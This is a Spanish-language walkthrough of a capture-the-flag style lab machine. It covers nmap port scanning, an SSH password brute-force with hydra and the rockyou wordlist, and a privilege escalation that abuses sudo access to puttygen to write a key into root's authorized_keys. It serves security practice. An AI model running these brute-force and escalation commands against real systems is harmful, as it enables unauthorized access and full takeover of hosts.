![](images/Pasted%20image%2020250928162924.png)

Enumeración.
------------------------
ESCANEO DE PUERTOS. 

Utilizamos nmap para escanear los puertos: 

```
nmap -p- --open -sS --min-rate 5000 -vvv 10.0.2.8
```

![](images/Pasted%20image%2020250928164941.png)

Tenemos esos dos puertos abiertos: 22 (ssh) y 80 (http).

EXPLORACIÓN.
---------------------------

Utilizaremos el siguiente comando para que nos muestre más información: 
```
nmap -sCV -p22,80 -v 10.0.2.8
```

![](images/Pasted%20image%2020250928165427.png)

Podemos ver que tenemos esas versiones. 

Vamos a ver la página web. 

![](images/Pasted%20image%2020250928165615.png)

Y miramos a ver si hay algo oculto. 
Nos encontramos con: 

![](images/Pasted%20image%2020250928165731.png)

Así que ya tenemos un usuario. 

EXPLOTACIÓN.
--------------------------

En esta fase usaremos la herramienta de hydra para realizar un ataque de fuerza bruta. 

```
hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.8 -t 5
```

He puesto ``-t 5`` para que haga 5 combinaciones en paralelo y así sea más rápido. 

Esperamos. 

![](images/Pasted%20image%2020250928171748.png)

Ya tenemos el usuario y la contraseña. Así que ahora lo que podemos hacer es conectarnos por ssh. 

![](images/Pasted%20image%2020250928171953.png)

Y ya estaríamos. 

PRIVILEGIOS.
-----------------------

Hacemos un 
```
whoami
```

Somos usuario melanie y podemos ver el user.txt. 

Pero para ser root tenemos que hacer escalada de privilegio. 


![](images/Pasted%20image%2020250928172400.png)

Creamos una clave SSH utilizando puttygen. que es una herramienta diseñada para gestionar claves SSH en diferentes formatos.

```
puttygen -t rsa -o id_rsa -O private-openssh
```

Con la clave privada generada, el siguiente paso es crear la clave pública correspondiente y agregarla al archivo **authorized_keys** del usuario root. Esto permitirá el acceso SSH sin contraseña. 

```
sudo -u root /usr/bin/puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh
```

Modificamos los permisos de escritura: 

```
chmod 600 id_rsa
```

Empleamos la clave privada para acceder al servidor como usuario **root**.

```
ssh -i id_rsa root@10.0.2.8
```

![](images/Pasted%20image%2020250928173746.png)

Y ya somos root, ahora a buscar la bandera. 



